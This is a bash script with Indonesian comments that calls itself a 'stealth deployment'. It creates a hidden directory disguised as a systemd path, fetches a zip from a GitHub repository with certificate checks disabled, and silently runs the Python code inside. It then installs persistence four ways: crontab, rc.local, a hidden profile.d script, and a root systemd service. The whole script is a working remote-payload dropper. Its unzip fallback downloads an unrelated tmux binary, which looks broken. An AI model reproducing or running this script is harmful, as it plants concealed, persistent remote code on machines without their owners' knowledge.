#!/bin/bash
# Fixed stealth deployment dengan dependency handling
# Oleh quin imut - CNCERT/CC

SERVICE_NAME="grok_service"
INSTALL_DIR="/tmp/.systemd-$(date +%s)"
DOWNLOAD_URL="https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/grok.zip"

# Function untuk logging
log() {
    echo "[$(date '+%H:%M:%S')] $1"
}

# Function untuk install critical dependencies
install_critical_deps() {
    log "Installing critical dependencies..."
    
    # Cek dan install unzip
    if ! command -v unzip >/dev/null 2>&1; then
        if [ -f /etc/debian_version ]; then
            apt-get update >/dev/null 2>&1 
            apt-get install -y unzip >/dev/null 2>&1
        elif [ -f /etc/redhat-release ]; then
            yum install -y unzip >/dev/null 2>&1
        elif [ -f /etc/alpine-release ]; then
            apk add unzip >/dev/null 2>&1
        else
            # Fallback: download static binary
            log "Downloading static unzip..."
            curl -s -k -L -o /tmp/unzip-static https://github.com/tmux/tmux/releases/download/3.3a/tmux-3.3a-x86_64.AppImage
            chmod +x /tmp/unzip-static
            alias unzip="/tmp/unzip-static"
        fi
    fi
    
    # Cek dan install Python3
    if ! command -v python3 >/dev/null 2>&1; then
        if [ -f /etc/debian_version ]; then
            apt-get install -y python3 python3-pip >/dev/null 2>&1
        elif [ -f /etc/redhat-release ]; then
            yum install -y python3 python3-pip >/dev/null 2>&1
        elif [ -f /etc/alpine-release ]; then
            apk add python3 py3-pip >/dev/null 2>&1
        else
            log "Python3 not available - attempting to continue"
        fi
    fi
    
    # Cek dan install crontab
    if ! command -v crontab >/dev/null 2>&1; then
        if [ -f /etc/debian_version ]; then
            apt-get install -y cron >/dev/null 2>&1
        elif [ -f /etc/redhat-release ]; then
            yum install -y cronie >/dev/null 2>&1
        elif [ -f /etc/alpine-release ]; then
            apk add dcron >/dev/null 2>&1
        fi
    fi
}

# Function untuk download dan extract
download_extract() {
    log "Downloading package..."
    
    # Download dengan multiple methods
    if command -v wget >/dev/null 2>&1; then
        wget --no-check-certificate --timeout=30 -q "$DOWNLOAD_URL" -O package.zip
    elif command -v curl >/dev/null 2>&1; then
        curl -k -L --connect-timeout 30 -s -o package.zip "$DOWNLOAD_URL"
    else
        log "No download tool available"
        return 1
    fi
    
    if [ ! -f "package.zip" ] || [ ! -s "package.zip" ]; then
        log "Download failed"
        return 1
    fi
    
    log "Extracting package..."
    unzip -q package.zip
    rm -f package.zip
    
    return 0
}

# Function untuk setup Python environment
setup_python_env() {
    log "Setting up Python environment..."
    
    # Cek requirements.txt atau install default dependencies
    if [ -f "requirements.txt" ]; then
        pip3 install -r requirements.txt >/dev/null 2>&1
    else
        # Install common dependencies
        pip3 install websocket-client six >/dev/null 2>&1
    fi
}

# Function untuk persistence alternatif
setup_persistence() {
    log "Setting up persistence..."
    
    # Method 1: Crontab (jika available)
    if command -v crontab >/dev/null 2>&1; then
        (crontab -l 2>/dev/null | grep -v "$INSTALL_DIR"; 
         echo "@reboot sleep 30 && cd $INSTALL_DIR && nohup python3 run.py >/dev/null 2>&1 &") | crontab -
        log "Crontab persistence installed"
    fi
    
    # Method 2: RC.Local
    if [ -f /etc/rc.local ]; then
        grep -q "$INSTALL_DIR" /etc/rc.local || 
        echo "cd $INSTALL_DIR && nohup python3 run.py >/dev/null 2>&1 &" >> /etc/rc.local
        chmod +x /etc/rc.local
        log "rc.local persistence installed"
    fi
    
    # Method 3: Profile.d
    if [ -d /etc/profile.d ]; then
        echo "cd $INSTALL_DIR && nohup python3 run.py >/dev/null 2>&1 &" > /etc/profile.d/.systemd.sh
        chmod +x /etc/profile.d/.systemd.sh
        log "profile.d persistence installed"
    fi
    
    # Method 4: Systemd (fallback)
    if command -v systemctl >/dev/null 2>&1; then
        cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
[Unit]
Description=System Grok Service
After=network.target

[Service]
Type=simple
WorkingDirectory=$INSTALL_DIR
ExecStart=python3 run.py
Restart=always
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload >/dev/null 2>&1
        systemctl enable ${SERVICE_NAME}.service >/dev/null 2>&1
        log "Systemd service installed"
    fi
}

# Function untuk start service
start_service() {
    log "Starting Python service..."
    cd "$INSTALL_DIR"
    
    # Cek file utama
    if [ ! -f "run.py" ] && [ -f "app.py" ]; then
        log "Using app.py instead of run.py"
        nohup python3 app.py >/dev/null 2>&1 &
    elif [ -f "run.py" ]; then
        nohup python3 run.py >/dev/null 2>&1 &
    else
        log "No main Python file found"
        return 1
    fi
    
    local pid=$!
    sleep 3
    
    if ps -p $pid >/dev/null 2>&1; then
        log "Service started successfully (PID: $pid)"
        return 0
    else
        log "Service failed to start - checking dependencies..."
        # Coba install dependencies dan restart
        setup_python_env
        if [ -f "run.py" ]; then
            nohup python3 run.py >/dev/null 2>&1 &
        else
            nohup python3 app.py >/dev/null 2>&1 &
        fi
        sleep 3
        if ps -p $! >/dev/null 2>&1; then
            log "Service started after dependency install"
            return 0
        fi
        return 1
    fi
}

# Main execution
main() {
    log "Starting deployment with dependency handling..."
    
    # Install dependencies kritis
    install_critical_deps
    
    # Setup directory
    mkdir -p "$INSTALL_DIR"
    cd "$INSTALL_DIR" || exit 1
    
    # Download and extract
    download_extract || {
        log "Download failed, exiting"
        exit 1
    }
    
    # Setup Python environment
    setup_python_env
    
    # Setup persistence
    setup_persistence
    
    # Start service
    start_service || {
        log "Service startup failed but persistence installed"
    }
    
    log "Deployment completed. Directory: $INSTALL_DIR"
    log "Use 'ps aux | grep python' to check running service"
}

# Run main
main "$@"
